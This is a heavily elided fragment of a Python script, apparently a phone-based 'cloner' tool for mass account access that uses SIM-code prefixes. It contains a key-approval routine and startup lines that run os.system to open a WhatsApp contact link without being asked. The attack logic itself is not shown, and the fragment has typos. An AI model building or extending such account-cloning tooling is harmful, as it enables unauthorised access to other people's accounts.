...
print('\n\033[1;37m MR SYAL TOOLS UPDATE...\n NICE CLONER...')
import uuid
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://wa.me/93704924100')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
def m1():
    ...
    print('\x1b[1;92m[syal] See Note : PUT YOUR SIM CODE ')
    lines()
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('🅷︎🅴︎🅻︎🅻︎🅾︎%20🆁︎🅾︎🅻︎🅴︎🆇︎-jamil-visal-🆂︎🅰︎🅷︎🅸︎🅱︎%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93704924100?text='+tks),approval()
      time.sleep(1)
      riaz()
  except:
    sys.exit()
